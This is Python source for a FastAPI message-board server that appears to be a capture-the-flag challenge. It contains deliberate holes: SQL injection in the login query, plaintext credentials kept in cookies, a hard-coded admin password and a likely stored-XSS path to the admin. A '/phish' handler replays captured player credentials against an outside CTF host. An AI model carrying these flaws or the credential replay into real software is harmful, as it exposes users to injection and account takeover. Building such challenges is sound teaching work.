import os
import re
from fastapiHelper import startAmis,sql
from fastapi import Body, Cookie, FastAPI, Form, Path, Request, Response
from fastapi.responses import JSONResponse, HTMLResponse
from fastapi.staticfiles import StaticFiles
import uvicorn

app=FastAPI()
startAmis(app,'login',"OUutvzyoSVZWYTSIZB@&v")
#===========================login===============================
@app.post('/api/login')
def login(username:str=Body(...), password:str=Body(...)):
  if sql.get(f"""select * from accounts where username="{username}" and password="{password}" limit 1""").__len__()==0:
    return JSONResponse({'msg':'无效的用户名或密码'},403)
  else:
    res=JSONResponse({'msg':'登录成功'})
    res.set_cookie('username',username)
    res.set_cookie('password',password)
    return res

@app.post('/api/register')
def register(username:str=Body(...), password:str=Body(...), inviteCode:str=Body(...)):
  if inviteCode!='r0v0t 2022 with randomToken':
    return JSONResponse({'msg':'邀请码错误'},403)
  else:
    if sql.set('insert into accounts values(??,??)',username,password):
      return JSONResponse({'msg':'注册成功'})
    else:
      return JSONResponse({'msg':'用户名已存在'},403)
#==============================messageBox===========================================
@app.middleware("http")
async def userCheck(request: Request, call_next):
  if re.match('^/api/user',request.url.path) and request.cookies.get('username')==None:
    return JSONResponse({'msg':'请先登录'},403)
  response = await call_next(request)
  return response

@app.get('/api/user/getMessages')
def getMessage():
  return JSONResponse(sql.getListDict('id,sender,message','messages'))

@app.post('/api/user/leaveMessage')
def leaveMessage(username:str=Cookie(...), message:str=Body(...,embed=True)):
  if sql.set('insert into messages(sender,message) values(??,??)',username,message):
    return JSONResponse({'msg':'留言成功'})
  else:
    return JSONResponse({'msg':'留言失败'},403)


@app.post('/api/user/report')
def report(id:str=Body(...),reason:str=Body(...), detail:str=Body(None)):
  sql.set('insert into report values(??,??,??)',id,reason,detail)
  return JSONResponse({'msg':'感谢您的反馈, 请联系管理员pyy, pyy会登录管理员界面进行处理'})
#==============================fish===========================
app.mount("/JSnake", StaticFiles(directory=os.path.join(os.path.dirname(__file__),'JSnake')), name="JSnake")
app.mount("/cheat", StaticFiles(directory=os.path.join(os.path.dirname(__file__),'cheat')), name="cheat")

def youWontLikeThis(username,password):
  import requests
  import re
  sess=requests.Session()
  nonce=re.findall("""(?<=<input id="nonce" name="nonce" type="hidden" value=").*?(?=">)""",sess.get("http://81.69.243.226:4000/login").text)[0]
  sess.post('http://81.69.243.226:4000/login',data={"name":username,"password":password,"nonce":nonce,"_submit":"Submit"})
  csrf_token=re.findall("""(?<='csrfNonce': ").*?(?=",)""",sess.get("http://81.69.243.226:4000/challenges").text)[0]
  ans2=sess.post('http://81.69.243.226:4000/api/v1/challenges/attempt',json={"challenge_id":6,"submission":"r00t{钓鱼成功}"},headers={'CSRF-Token':csrf_token})
  return ans2.text.find("You don't have the permission")==-1

@app.post("/phish",response_class=HTMLResponse)
def phish(name: str=Form('aodsiufcbv'), password: str=Form('3456bw7xasdfg')):
  if youWontLikeThis(name,password):
    return """<meta http-equiv="refresh" content="0;url=http://81.69.243.226:4000/challenges">"""
  else:
    return """<meta http-equiv="refresh" content="0;url=/cheat/loginFail.html">"""
#==================================admin====================================
@app.middleware("http")
async def adminCheck(request: Request, call_next):
  if re.match('^/api/admin',request.url.path) and (request.cookies.get('username')!='pyy' or request.cookies.get('password')!='1eDydsQz7LJ_TIj_78aBcVC!aOw1$3@'):
    return JSONResponse({'msg':'你cookie里的账户密码不对, 你不是admin!'},403)
  response = await call_next(request)
  return response

@app.get('/api/admin/getReport')
def getReport():
  return JSONResponse(sql.getListDict('id,reason,detail,message','report natural join messages'))

@app.post('/api/admin/deleteMessage')
def deleteMessage(id:int=Body(...,embed=True)):
  sql.set("delete from messages where id=??",id)
  return JSONResponse({'msg':'删除成功'})

@app.post('/api/admin/deleteReport')
def deleteReport(id:int=Body(...),reason:str=Body(...)):
  sql.set("delete from report where id=?? and reason=??",id,reason)
  return JSONResponse({'msg':'删除成功'})

@app.get('/api/admin/getFlag')
def getFlag():
  return JSONResponse({'flag':"r00t{想不出flag内容了, 那就这样吧}"})

if __name__ == '__main__':
  #os.system("start msedge 127.0.0.1:8080")
  uvicorn.run("app:app",host="0.0.0.0",port=8080)
